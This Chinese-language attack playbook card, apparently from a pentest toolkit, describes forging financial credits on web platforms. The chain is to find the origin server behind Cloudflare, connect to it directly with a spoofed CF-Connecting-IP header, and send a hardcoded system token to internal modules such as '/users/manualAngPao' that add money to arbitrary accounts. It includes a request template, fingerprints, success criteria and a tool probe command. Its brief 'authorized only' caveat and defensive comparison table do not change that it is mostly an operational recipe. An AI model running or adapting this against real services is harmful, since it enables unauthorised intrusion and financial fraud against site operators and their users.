# 硬编码系统令牌 + CF-Connecting-IP → 资金写入 — 手法

> 笔记原图：（开源包不收个案摘记）  
> 同族：`血路·雾墙.md`（可信头 + 源站；那边打 Create*，本卡打 **硬编码 Token + 加款 module**）  
> Skill：`杀招/和稀泥·死契` · 工具：`炼蛊房/hardcoded_token_cfip.py`  
> CDN：`杀招/云帷` · 入账验证可挂 `payment-callback-forgery` 口径  
> **仅授权 targets**；耗余额/大额加款先问。

---

## 0. 一句话

源码硬编码的系统令牌（如 `ARSYSTEMTOKEN` → 请求参数 `accessToken`）本应只给内网/白名单 IP；若 **Caddy/PHP 取客户端 IP 时信任 `CF-Connecting-IP`**，则 **直连源站 + 伪造该头** 即可冒充白名单，调用「手动发红包 / 手工加款」类 module → **任意用户资金写入**。

与假支付分工：假支付打 HTTP notify 验签；本卡打 **内部管理 RPC + 可信头 + 硬编码密钥**。

---

## 1. 标准链（笔记已确认形态）

```text
① CDN/证书溯源 → 源站 IP（NLB/CF 外可达）
② 直连源站 + Host: 业务域
   Header: CF-Connecting-IP: <白名单/网关 IP>
   （Caddy 回源判断 + PHP 取 IP 都信此头）
③ POST /api/v1/index.php
     accessToken=<源码硬编码 ARSYSTEMTOKEN>
     module=/users/manualAngPao   # 手动发红包 = 给指定用户加钱
     + 用户/金额等业务字段
④ 查目标用户余额差分 → L2/L3
```

模块名随站变化：`manualAngPao` / `manualRedPacket` / `addBalance` / `admin/credit` —— **模式**是「系统 Token + IP 门禁 + 加款动作」。

---

## 2. 适用指纹

| 层 | 指纹 |
|----|------|
| 入口 | `/api/v1/index.php` 或统一 `module=` 路由网关 |
| 令牌 | 源码/配置 `ARSYSTEMTOKEN`、`SYSTEM_TOKEN`、`INTERNAL_TOKEN`；前端/备份误带 |
| IP 门禁 | PHP `$_SERVER['HTTP_CF_CONNECTING_IP']` / Caddy `trusted_proxies` 误配 |
| 边缘 | Cloudflare / NLB；**源站仍对公网开放** |
| 动作 | 红包、手工加款、补单、调账、`manual*` |

白盒：DeepAudit / 源码搜 `ARSYSTEMTOKEN`、`CF-Connecting-IP`、`manualAngPao`。

---

## 3. 原理

| 条件 | 危险实现 | 安全对照 |
|------|----------|----------|
| 取客户端 IP | 优先 `CF-Connecting-IP` / `X-Forwarded-For` | 仅信 `REMOTE_ADDR`，且源站防火墙只放行 CF IP |
| 系统 Token | 硬编码进仓库/前端 | 环境变量 + 轮换；永不进客户端包 |
| 加款 API | Token+IP 即过，无二次审批 | 管理会话 + 审计 + 金额阈值 |
| 源站暴露 | 公网可直连 | 仅 CF/内网回源 |

经 Cloudflare 边缘时，边缘会覆盖/剥离客户端伪造的 CF 头 → **伪头通常无效**；必须 **直连源站**（与 autopay 卡同命门）。

---

## 4. 复现清单（授权）

```text
① scope；支付/API 异 host → scope_expand
② origin_recon / cert-origin 拿候选源站；--resolve 或 Host 直连验证
③ 源码/备份/JS 抽 accessToken / ARSYSTEMTOKEN（勿把报告样例 Token 当通用钥）
④ 猜/读白名单 IP（配置、同站回显、历史网关、文档）
⑤ 矩阵：
     经 CF：伪 CF-Connecting-IP → 预期拒
     直连源站 + 伪头 + Token + module → 预期通
⑥ 最小额加到自控测试用户；余额接口差分
⑦ 固化 案卷/hardcoded_cfip/；大额先问
```

### 成功口径

| 级 | 标准 |
|----|------|
| L0 | 源站可达 + 疑似系统 Token + module 路由 |
| L1 | 直连+伪头后 Token 门禁放行（错误码相对「无头/错头」差分） |
| L2 | 加款/红包接口业务成功（非仅 HTTP 200） |
| L3 | **自控测试用户余额增值**（硬条件） |

---

## 5. 探针

```bash
python3 炼蛊房/hardcoded_token_cfip.py probe \
  --origin-ip <源站IP> --host api.授权域 \
  --token "$ARSYSTEMTOKEN" \
  --module '/users/manualAngPao' \
  --cf-ip <白名单IP> \
  --case <案卷> \
  --extra-json '{"userId":1,"amount":1}'
```

对照：`--via-cdn` 打业务域名（预期失败） vs 直连（预期成功）。

## 6. 与其它手法对照

| 手法 | 差异 |
|------|------|
| `autopay-CF头伪造资金链` | 同可信头；动作是 CreateTransaction/开 ADMIN |
| 假支付 notify | 无源站要求；打验签 |
| Spring `trusted_header_ip_spoof` | Java Gateway 族；模式同「信客户端头」 |
| 硬编码 Bot Token | TG 面；见 webhook 劫持卡 |
